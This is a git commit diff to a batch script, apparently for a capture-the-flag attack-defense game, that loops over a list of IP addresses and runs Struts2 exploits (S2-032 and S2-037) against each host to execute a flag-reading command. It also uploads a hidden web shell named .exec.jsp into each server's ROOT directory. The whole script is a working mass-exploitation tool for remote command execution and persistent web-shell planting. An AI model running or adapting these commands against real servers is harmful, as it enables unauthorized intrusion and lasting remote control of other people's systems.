89de291b08746c9ce1ac22a51acfd5ae01a52ee4
hanc00l <hancool@163.com>
2016-06-23 16:31:28 +0800

    update batch s2

--- batch_s2.py
+++ batch_s2.py
@@ -11,20 +11,17 @@ fi
 #get flag by s2-032
 cat $iplist_file | while read line
 do
-    msg=$(python /Users/hancool/pentest/web/struts2-032/s2-032.py -u http://$line:8080/struts2-showcase/index.action -c "$getflag")
-    echo $msg
+    python /Users/hancool/pentest/web/struts2-032/s2-032.py -u http://$line:8080/struts2-showcase/index.action -c "$getflag"
 done
 
 #get flag by s2-037
 cat $iplist_file | while read line
 do
-    msg=$(python /Users/hancool/pentest/web/struts2/S2-037_CmdToolExP.py -u http://$line:8080/struts2-rest-showcase/orders/3 -command "$getflag")
-    echo $msg
+    python /Users/hancool/pentest/web/struts2/S2-037_CmdToolExP.py -u http://$line:8080/struts2-rest-showcase/orders/3 -command "$getflag"
 done
 
 #upload exec.jsp by s2-032
 cat $iplist_file | while read line
 do
-    msg=$(python /Users/hancool/pentest/web/struts2-032/s2-032.py -u http://$line:8080/struts2-showcase/index.action --upload --remote_file ../ROOT/.exec.jsp --local_file /Users/hancool/pentest/web/struts2-032/exec.jsp)
-    echo $msg
+   python /Users/hancool/pentest/web/struts2-032/s2-032.py -u http://$line:8080/struts2-showcase/index.action --upload --remote_file ../ROOT/.exec.jsp --local_file /Users/hancool/pentest/web/struts2-032/exec.jsp
 done
